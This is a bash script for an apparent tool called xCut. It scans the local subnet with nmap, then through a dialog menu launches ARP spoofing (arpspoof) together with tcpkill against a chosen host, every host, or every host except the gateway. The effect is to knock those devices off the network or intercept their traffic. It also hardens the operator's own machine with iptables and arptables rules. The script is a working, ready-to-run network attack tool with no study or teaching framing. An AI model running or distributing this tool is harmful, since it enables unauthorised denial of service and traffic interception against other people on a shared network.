#!/usr/bin/env bash
trap '' INT TERM ERR EXIT TSTP

# resolve helper scripts
DIR="$(dirname "$(readlink -f "$0")")"

source "$DIR"/utils/color.sh
source "$DIR"/utils/spinner.sh

VERSION=$(cat "$DIR"/CHANGELOG.md | grep -Po "([0-9]+([.][0-9]+)+)" | tail -1)
DATE=$(cat "$DIR"/CHANGELOG.md | grep -Eo '[[:digit:]]{4}-[[:digit:]]{2}-[[:digit:]]{2}' | tail -1)

# request super user
[ "$UID" -eq 0 ] || exec sudo "$0" "$@"

appName=xCut

# Helper variables
dlg=dialog
std=--stdout


MENU_HEIGHT=15
MENU_WIDTH=0
MENU_CHOICE_HEIGHT=8
TITLE="$appName"
MENU_TITLE="Control Panel"

JUST_PROTECT_INDEX='M'
ALL_SUBNET_INDEX='A'
ALL_SUBNET_BUT_GATEWAY_INDEX='G'

function logo(){
	echo
	echo -e "${BGreen}			██╗  ██╗";
	echo -e "${BGreen}			╚██╗██╔╝ ██████╗██╗   ██╗████████╗";
	echo -e "${BGreen} 			 ╚███╔╝ ██╔════╝██║   ██║╚══██╔══╝						  ";
	echo -e "${BGreen}			 ██╔██╗ ██║     ██║   ██║   ██║        ${BPurple}$DATE ${BYellow}";
	echo -e "${BGreen}			██╔╝ ██╗╚██████╗╚██████╔╝   ██║   ";
	echo -e "${BGreen}			╚═╝  ╚═╝ ╚═════╝ ╚═════╝    ╚═╝     ${BRed}$VERSION ${BYellow}is starting   ";
	echo -e "${Color_Off}                                  ";
}

function restoreState(){
	trap '' INT TERM ERR EXIT TSTP
	clear
	start_spinner "${BGreen}War ended! back to peace mode${Color_Off}"
	iptables -F &> /dev/null
	ip -s -s neigh flush all &> /dev/null
	arptables -P INPUT ACCEPT &> /dev/null
	arptables --flush &> /dev/null
	arp -s $routerIp $routerMac  &> /dev/null
	sysctl -w net.ipv4.ip_forward=1 &> /dev/null
    stop_spinner $?
    trap 'exit 0' INT TERM ERR EXIT TSTP
}

function _kill_leftovers(){	
	start_spinner "${BGreen}Stopping attack${Color_Off}"
    for i in `jobs -pr`; do
    	if [[ `ps -p $i -o comm | tail -1` == "tcpkill" ]]; then
    		kill -PIPE $i
    	elif [[ `ps -p $i -o comm | tail -1` == "arpspoof" ]]; then
    		kill -INT $i
    	fi
   	done
    stop_spinner $?
}

function installDependency(){
	if [[ -z $(dpkg -l | cut -d " " -f 3 | grep "^$1") ]]; then 
		start_spinner "${BRed}\t✗ Installing $1 ${Color_Off}"
		apt --yes install "$1" &> /dev/null; 
		stop_spinner $?

	else
		echo -e "${BGreen}\t✓ $1 ${Color_Off}"
	fi
}

logo
sleep 1

function installDependencies(){
	echo -e "${BYellow}Checking dependencies${Color_Off}"
	installDependency "dsniff"
	installDependency "arptables"
	installDependency "arp-scan"
	installDependency "net-tools"
	installDependency "dialog"
	installDependency "nmap"
}

installDependencies

mask2cdr ()
{
   # Assumes there's no "255." after a non-255 byte in the mask
   local x=${1##*255.}
   set -- 0^^^128^192^224^240^248^252^254^ $(( (${#1} - ${#x})*2 )) ${x%%.*}
   x=${1%%$3*}
   echo $(( $2 + (${#x}/4) ))
}


function getNetworkInfo(){
	routerIp=$(ip route show | grep -i 'default via'| grep proto | awk '{print $3 }')
	routerMac=$(ip neigh show $(ip route list | grep -m1 default |awk '{print $3}') | awk '{print $5}')
	networkInterface=$(ip route show | grep -i 'default via' | grep proto | awk '{print $5 }')
	subnetMaskIp=$(ifconfig $networkInterface | grep netmask | xargs | cut -d' ' -f4)
	subnetMaskDec=$(mask2cdr $subnetMaskIp)

	IFS=. read -r i1 i2 i3 i4 <<< "$routerIp"
	IFS=. read -r m1 m2 m3 m4 <<< "$subnetMaskIp"

	networkIp=$((i1 & m1)).$((i2 & m2)).$((i3 & m3)).$((i4 & m4))
	broadcastIp=$((i1 & m1 | 255-m1)).$((i2 & m2 | 255-m2)).$((i3 & m3 | 255-m3)).$((i4 & m4 | 255-m4))
	firstIp=$((i1 & m1)).$((i2 & m2)).$((i3 & m3)).$(((i4 & m4)+1))
	lastIp=$((i1 & m1 | 255-m1)).$((i2 & m2 | 255-m2)).$((i3 & m3 | 255-m3)).$(((i4 & m4 | 255-m4)-1))
}

getNetworkInfo

function protectMe(){
	start_spinner "${BYellow}Powering on Defenses${Color_Off}"
	iptables -F  &> /dev/null
	iptables -t raw --insert PREROUTING --in-interface $routerIp --match mac ! --mac-source $routerMac --jump DROP &> /dev/null
	ip -s -s neigh flush all &> /dev/null
	arptables -P INPUT DROP &> /dev/null
	arptables -A INPUT --source-mac $routerMac -j ACCEPT &> /dev/null
	arp -s $routerIp $routerMac  &> /dev/null
	sysctl -w net.ipv4.ip_forward=0 &> /dev/null
	# Drop excessive RST packets to avoid smurf attacks
	iptables -A INPUT -p tcp -m tcp --tcp-flags RST RST -m limit --limit 2/second --limit-burst 2 -j ACCEPT &> /dev/null
	# Don't allow pings through
	iptables -A INPUT -p icmp --icmp-type 8 -m state --state NEW,ESTABLISHED,RELATED -j REJECT &> /dev/null
	iptables -A OUTPUT -p icmp --icmp-type 0 -m state --state ESTABLISHED,RELATED -j REJECT &> /dev/null

	# Drop all invalid packets
	iptables -A INPUT -m state --state INVALID -j DROP &> /dev/null
	iptables -A FORWARD -m state --state INVALID -j DROP &> /dev/null
	iptables -A OUTPUT -m state --state INVALID -j DROP &> /dev/null

	stop_spinner $?
}


function scanNetwork(){
	trap '' INT TERM ERR EXIT TSTP

	start_spinner "${BYellow}ScAnNiNg for targets${Color_Off}"
	mapfile -t devicesTMP < <(nmap -sn -T5 -n $networkIp/$subnetMaskDec --min-parallelism 100 | sed -e '2,$!d' -e '$d' | sed 'N;N;s/\n/ /g' | head -n -2 | cut -d' ' -f5,13,14-)
	readarray -t devices < <(for a in "${devicesTMP[@]}"; do echo "$a"; done | sort -k 1 -V)

	stop_spinner $?

	sleep .1

	devicesIp=()
	devicesMac=()
	devicesVendor=()
	formattedMenu=()

	formattedMenu+=("#" "Targets")

	for i in ${!devices[@]}; do
		device="${devices[$i]}"
		deviceIp=$(echo $device | cut -d' ' -f1)
		deviceMac=$(echo $device | cut -d' ' -f2)
		deviceVendor=$(echo $device | cut -d' ' -f3-)

		devicesIp+=("$deviceIp")
		devicesMac+=("$deviceMac")
		devicesVendor+=("$deviceVendor")
		formattedMenu+=("$i" "    $deviceIp # $deviceMac # $deviceVendor")
	done

	formattedMenu+=("" "")
	formattedMenu+=("$JUST_PROTECT_INDEX" "Protect ME")
	formattedMenu+=("" "Launch attack on")

	formattedMenu+=("$ALL_SUBNET_INDEX" "    all targets")
	formattedMenu+=("$ALL_SUBNET_BUT_GATEWAY_INDEX" "    all targets # excluding gateway")

	trap 'restoreState' INT TERM TSTP EXIT
}

function _attack() {
	TARGET="$1"
	tcpkill -i $networkInterface -3 host "$TARGET" > /dev/null 2>&1 &
	arpspoof -i $networkInterface -t "$routerIp" "$TARGET" > /dev/null 2>&1 &
	arpspoof -i $networkInterface -t "$TARGET" "$routerIp" > /dev/null 2>&1 &
}

protectMe
scanNetwork

while true; do

	CHOICE=$($dlg $std --title "$TITLE" --default-item '0' --column-separator "#" --extra-button --extra-label "Scan Network" --ok-label "Execute" --cancel-label "Exit" --menu "$MENU_TITLE" $MENU_HEIGHT $MENU_WIDTH $MENU_CHOICE_HEIGHT "${formattedMenu[@]}")

	MENU_BUTTON=$?
	# exec 3>&- # Close fd

	case "$MENU_BUTTON" in
	  0) MENU_BUTTON='Execute' ;;
	  1) MENU_BUTTON='Exit' ;;
	  3) MENU_BUTTON='Scan' ;;
	  *) exit ;;
	esac

	if [[ $MENU_BUTTON == 'Execute' ]]; then
		:
	elif [[ $MENU_BUTTON == 'Exit' ]]; then
			restoreState
			exit
	elif [[ $MENU_BUTTON == 'Scan' ]]; then
		clear
		scanNetwork
		continue
	fi

	if [[ "$CHOICE" == $JUST_PROTECT_INDEX ]]; then
		$dlg $std --title "Defense [ON]" --msgbox 'Press <Enter> to stop Protection' 8 30
	elif [[ $CHOICE == $ALL_SUBNET_INDEX ]]; then
		for each in "${devicesIp[@]}"
		do
			_attack "$each"
		done

		$dlg $std --title "Attack Launched" --msgbox 'Network is Under attack' 8 30
	elif [[ "$CHOICE" == $ALL_SUBNET_BUT_GATEWAY_INDEX ]]; then
		for each in "${devicesIp[@]}"
		do
			if [[ "$each" == "$routerIp" ]]; then
				continue
			fi
			_attack "$each"
		done
		$dlg $std --title "Attack Launched" --msgbox "Network is Under attack. But $routerIp ran away" 8 55
	elif [[ "$CHOICE" -ge "0" &&  "$CHOICE" -lt "${#devicesIp[@]}" ]]; then

		_attack "${devicesIp[$CHOICE]}"

		$dlg $std --title "Eliminating" --msgbox "   address: ${devicesIp[$CHOICE]} \n   mac:     ${devicesMac[$CHOICE]} \n   vendor:  ${devicesVendor[$CHOICE]}" 7 45
	fi
	clear
	_kill_leftovers
	scanNetwork
done
